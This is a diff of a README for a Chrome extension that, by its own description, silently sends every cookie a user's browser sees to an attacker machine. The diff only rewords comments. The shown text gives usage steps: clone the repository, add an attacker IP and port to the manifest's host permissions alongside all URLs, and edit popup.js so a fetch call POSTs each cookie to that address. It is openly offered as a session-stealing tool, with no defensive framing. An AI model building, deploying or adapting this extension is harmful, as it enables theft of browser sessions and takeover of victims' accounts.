@@ -5,7 +5,7 @@ This is a chrome extention that will send all cookies it sees while the user bro
 # How The Heck To Use It:
 Download:  
 ```git clone https://github.com/SteamPunk424/Cookie_Stealer_Chrome_Extension```  
-Open manifest.json with nano and change the host permissions to allow the extention to send to your ip/attacker computer:  
+Open manifest.json with nano and change the host permissions to allow the extention to send to the attacker computer:  
 ```
 {
   "manifest_version": 3,
@@ -21,7 +21,7 @@ Open manifest.json with nano and change the host permissions to allow the extent
   "host_permissions": [
     "<all_urls>",
     "http://127.0.0.1/*",
-    "http://10.10.15.17:8080/*" <---- This one here.
+    "http://10.10.15.17:8080/*" <---- Attacker IP and Port
   ]
 }
 
@@ -29,7 +29,7 @@ Open manifest.json with nano and change the host permissions to allow the extent
 Also change popup.js to send the cookie to your ip and port of your choosing:    
 ```
 function sendCookieToProxy(cookie) {
-  fetch('http://10.10.15.17:8080/cookie', { <--- Your attacker ip and port
+  fetch('http://10.10.15.17:8080/cookie', { <--- Attacker IP and Port
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
